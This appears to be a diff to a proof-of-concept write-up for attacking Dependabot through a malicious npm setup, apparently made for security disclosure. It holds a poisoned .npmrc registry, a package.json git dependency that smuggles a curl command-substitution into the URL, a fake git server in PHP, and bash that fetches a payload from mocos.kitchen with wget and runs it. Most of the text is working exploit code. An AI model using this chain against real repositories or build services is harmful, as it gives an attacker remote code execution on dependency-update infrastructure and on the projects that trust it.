@@ -4,12 +4,12 @@
 
 Add following files:
 
-.npmrc
+`.npmrc`
 ```
-registry="http://registry.npmjs.org@mocos.kitchen/"
+registry="http://registry.npmjs.org@mocos.kitchen/registry"
 ```
 
-package-lock.json
+`package-lock.json`
 ```
 {
   "name": "javascript",
@@ -24,7 +24,7 @@ package-lock.json
 }
 ```
 
-package.json
+`package.json`
 ```
 {
   "name": "javascript",
@@ -33,12 +33,12 @@ package.json
   "license": "MIT",
   "private": true,
   "dependencies": {
-    "registry11.json": "git+https://github.com.mocos.kitchen/github.com/$($(curl$IFS@mocos.kitchen:3000/bash.txt))$(ps)?/github.com/tyage/tyage-sample-package.git#semver:4.0.0"
+    "package1.json": "git+https://github.com.mocos.kitchen/github.com/$($(curl$IFS@mocos.kitchen:3000/bash.txt))$(ps)?/github.com/tyage/tyage-sample-package.git#semver:4.0.0"
   }
 }
 ```
 
-.github/dependabot.yml
+`.github/dependabot.yml`
 ```
 ---
 version: 2
@@ -51,7 +51,7 @@ updates:
 
 ## Prepare Servers
 
-Two servers required.
+Following servers required.
 
 1. Fake npm registry
 
@@ -66,7 +66,7 @@ Two servers required.
 
 2. Fake git repository
 
-`http://github.com.mocos.kitchen/github.com/...` should run this PHP file:
+`https://github.com.mocos.kitchen/github.com/...` should run this PHP file:
 
 ```php
 <?php
@@ -98,4 +98,19 @@ if (!empty($input)) {
   header("content-type: application/x-git-upload-pack-advertisement");
   echo $result;
 }
+```
+
+3. Payload server
+
+`http://mocos.kitchen:3000/bash.txt` return this:
+
+```bash
+eval `wget mocos.kitchen:3000/payload.txt; bash payload.txt`
+```
+
+`http://mocos.kitchen:3000/payload.txt` return this:
+
+```bash
+# you can run arbitrary OS command here
+echo hello world
 ```
